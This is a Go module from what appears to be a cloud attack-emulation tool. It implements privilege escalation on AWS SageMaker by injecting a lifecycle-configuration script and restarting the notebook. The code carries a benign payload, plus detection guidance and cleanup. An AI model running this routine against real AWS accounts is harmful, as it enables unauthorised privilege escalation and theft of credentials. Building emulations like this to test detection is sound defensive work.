package aws

import (
	"context"
	_ "embed"
	"encoding/base64"
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/sagemaker"
	"github.com/aws/aws-sdk-go-v2/service/sagemaker/types"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

const configName = "priv-esc-config"

const scriptToExecute = `#!/bin/bash
set -e
# Execute a command as the high-privilege role and write output to a log file
aws sts get-caller-identity >> /home/ec2-user/SageMaker/exploit-privesc-stratus-log.txt 2>&1
aws iam list-users >> /home/ec2-user/SageMaker/exploit-privesc-stratus-log.txt 2>&1
`

//go:embed main.tf
var tf []byte
var notebookName string

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.execution.sagemaker-update-lifecycle-config",
		FriendlyName: "Execute Commands on SageMaker Notebook Instance via Lifecycle Configuration",
		Description: `
An attacker with permissions to stop, update, and start a SageMaker Notebook instance can execute code inside this instance by attaching a malicious lifecycle configuration script to a stopped instance. When the instance is restarted, this script executes automatically, allowing the attacker execute arbitrary commands, for instance to exfiltrate the instance's IAM execution role credentials.

Warm-up:

- Create a SageMaker Notebook Instance with an IAM Execution Role that possesses sensitive privileges (the victim role). 
- Create an Attacker IAM Identity with only the permissions to stop, update, and start the notebook and to inject a malicious lifecycle configuration script.

Detonation: 

- Update the lifecycle configuration script via a Stop-Update-Start API sequence
- Execute malicious code

References:

- https://www.plerion.com/blog/privilege-escalation-with-sagemaker-and-execution-roles
`,
		Detection: `
Through CloudTrail's <code>UpdateNotebookInstance</code> events. 
You can also watch for suspicious sequences of <code>StopNotebookInstance</code> and <code>StopNotebookInstance</code> events correlated with <code>UpdateNotebookInstance</code> events. 
`,
		Platform:                   stratus.AWS,
		IsSlow:                     true,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Execution, mitreattack.PrivilegeEscalation},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	client := sagemaker.NewFromConfig(providers.AWS().GetConnection())

	notebookName = params["target_notebook_name"]

	err := CreateNotebookLifecycleConfig(client, configName, scriptToExecute)
	if err != nil {
		log.Fatalf("Lifecycle config creation failed: %v", err)
	}

	err = UpdateAndRestartNotebook(client, notebookName, configName)
	if err != nil {
		log.Fatalf("Lifecycle config creation failed: %v", err)
	}

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {

	client := sagemaker.NewFromConfig(providers.AWS().GetConnection())

	notebookName = params["target_notebook_name"]

	err := DetachAndDeleteLifecycleConfig(client, notebookName, configName)
	if err != nil {
		log.Fatalf("Cleanup failed: %v", err)
	}
	return nil
}

// CreateNotebookLifecycleConfig defines and creates the lifecycle configuration.
func CreateNotebookLifecycleConfig(
	client *sagemaker.Client,
	configName string,
	onStartScript string) error {

	// 1. Base64 Encode the scripts
	// SageMaker requires the script content to be base64-encoded.
	onStartEncoded := base64.StdEncoding.EncodeToString([]byte(onStartScript))

	// 2. Prepare the Input payload
	input := &sagemaker.CreateNotebookInstanceLifecycleConfigInput{
		NotebookInstanceLifecycleConfigName: aws.String(configName),
	}

	// Add OnStart hook if script content is provided
	if strings.TrimSpace(onStartScript) != "" {
		input.OnStart = []types.NotebookInstanceLifecycleHook{
			{
				Content: aws.String(onStartEncoded),
			},
		}
	}

	// 3. Execute the API call
	log.Printf("Attempting to create lifecycle configuration: %s", configName)

	_, err := client.CreateNotebookInstanceLifecycleConfig(context.Background(), input)

	if err != nil {
		return fmt.Errorf("failed to create lifecycle config %s: %w", configName, err)
	}

	log.Printf("Successfully created lifecycle configuration: %s", configName)
	return nil
}

func UpdateAndRestartNotebook(
	client *sagemaker.Client,
	notebookName string,
	lifecycleConfigName string) error {

	ctx := context.Background()

	log.Printf("Starting workflow for Notebook: %s", notebookName)

	// --- 1. Stop the Notebook Instance (and wait for it to stop) ---
	log.Printf("1/4. Stopping notebook instance: %s...", notebookName)

	stopInput := &sagemaker.StopNotebookInstanceInput{
		NotebookInstanceName: aws.String(notebookName),
	}

	_, err := client.StopNotebookInstance(ctx, stopInput)
	if err != nil {
		// Non-critical error if the notebook is already stopping or stopped.
		log.Printf("Warning: Failed to initiate StopNotebookInstance (may already be stopped): %v", err)
	}

	// WAIT: Wait for the status to transition to 'Stopped'.
	log.Println("   Waiting for notebook to stop...")
	stopWaiter := sagemaker.NewNotebookInstanceStoppedWaiter(client)
	err = stopWaiter.Wait(ctx,
		&sagemaker.DescribeNotebookInstanceInput{
			NotebookInstanceName: aws.String(notebookName),
		},
		120*time.Second, // Timeout (adjust as needed)
	)
	if err != nil {
		return fmt.Errorf("failed while waiting for notebook to stop after initial stop: %w", err)
	}
	log.Println("   Notebook is stopped.")

	// --- 2. Update the Notebook Instance with the new Lifecycle Config ---
	log.Printf("2/4. Updating notebook instance with config: %s...", lifecycleConfigName)

	updateInput := &sagemaker.UpdateNotebookInstanceInput{
		NotebookInstanceName: aws.String(notebookName),
		LifecycleConfigName:  aws.String(lifecycleConfigName),
	}

	_, err = client.UpdateNotebookInstance(ctx, updateInput)
	if err != nil {
		return fmt.Errorf("failed to update notebook instance configuration: %w", err)
	}
	log.Println("   Update initiation successful. Status is now 'Updating'.")

	// --- 3. WAIT FOR UPDATE TO COMPLETE ---
	// The notebook transitions back to 'Stopped' after a successful update.
	log.Println("3/4. Waiting for notebook to complete update (transition back to 'Stopped')...")
	updateWaiter := sagemaker.NewNotebookInstanceStoppedWaiter(client)
	err = updateWaiter.Wait(ctx,
		&sagemaker.DescribeNotebookInstanceInput{
			NotebookInstanceName: aws.String(notebookName),
		},
		300*time.Second, // Wait longer for the update cycle
	)
	if err != nil {
		return fmt.Errorf("failed while waiting for notebook update to complete: %w", err)
	}
	log.Println("   Update complete. Notebook is back in 'Stopped' status.")

	// --- 4. Start the Notebook Instance (Triggers OnStart script) ---
	log.Printf("4/4. Starting notebook instance: %s...", notebookName)

	startInput := &sagemaker.StartNotebookInstanceInput{
		NotebookInstanceName: aws.String(notebookName),
	}

	_, err = client.StartNotebookInstance(ctx, startInput)
	if err != nil {
		return fmt.Errorf("failed to initiate StartNotebookInstance: %w", err)
	}

	log.Printf("Workflow complete. Notebook is now starting and running the lifecycle script.")
	return nil
}

// DetachAndDeleteLifecycleConfig performs the cleanup steps:
// 1. Stops the Notebook. 2. Detaches the config. 3. Deletes the config.
func DetachAndDeleteLifecycleConfig(
	client *sagemaker.Client,
	notebookName string,
	configName string) error {

	ctx := context.Background()
	log.Printf("Starting cleanup workflow for Notebook: %s and Config: %s", notebookName, configName)

	// --- 1. Stop the Notebook Instance (Prerequisite for Update) ---
	log.Println("1/4. Stopping notebook instance...")

	stopInput := &sagemaker.StopNotebookInstanceInput{
		NotebookInstanceName: aws.String(notebookName),
	}
	// We don't check for errors on initiation since it might already be stopped.
	_, _ = client.StopNotebookInstance(ctx, stopInput)

	// Wait for the instance to fully stop.
	stopWaiter := sagemaker.NewNotebookInstanceStoppedWaiter(client)
	err := stopWaiter.Wait(ctx,
		&sagemaker.DescribeNotebookInstanceInput{
			NotebookInstanceName: aws.String(notebookName),
		},
		120*time.Second, // Timeout
	)
	if err != nil {
		return fmt.Errorf("failed while waiting for notebook to stop: %w", err)
	}
	log.Println("   Notebook is stopped.")

	// --- 2. Detach the Lifecycle Configuration ---
	// Update the Notebook Instance to use an empty LifecycleConfigName, effectively detaching it.
	log.Println("2/4. Detaching lifecycle configuration...")

	detachInput := &sagemaker.UpdateNotebookInstanceInput{
		NotebookInstanceName: aws.String(notebookName),
		// Setting LifecycleConfigName to an empty string pointer detaches the current configuration.
		LifecycleConfigName: aws.String(""),
	}

	_, err = client.UpdateNotebookInstance(ctx, detachInput)
	if err != nil {
		return fmt.Errorf("failed to detach lifecycle configuration: %w", err)
	}
	log.Println("   Detach request successful. Status is now 'Updating'.")

	// --- 3. WAIT for Detach Update to Complete ---
	// Must wait for the 'Updating' status to resolve back to 'Stopped' before deleting the config.
	log.Println("3/4. Waiting for detach update to complete...")
	updateWaiter := sagemaker.NewNotebookInstanceStoppedWaiter(client)
	err = updateWaiter.Wait(ctx,
		&sagemaker.DescribeNotebookInstanceInput{
			NotebookInstanceName: aws.String(notebookName),
		},
		300*time.Second, // Wait longer for the update cycle
	)
	if err != nil {
		return fmt.Errorf("failed while waiting for notebook detach update to complete: %w", err)
	}
	log.Println("   Detach update complete. Notebook is back in 'Stopped' status.")

	// --- 4. Delete the Lifecycle Configuration ---
	log.Println("4/4. Deleting the lifecycle configuration...")

	deleteInput := &sagemaker.DeleteNotebookInstanceLifecycleConfigInput{
		NotebookInstanceLifecycleConfigName: aws.String(configName),
	}

	_, err = client.DeleteNotebookInstanceLifecycleConfig(ctx, deleteInput)
	if err != nil {
		return fmt.Errorf("failed to delete lifecycle config %s: %w", configName, err)
	}

	log.Printf("Cleanup complete: Config %s deleted.", configName)
	return nil
}
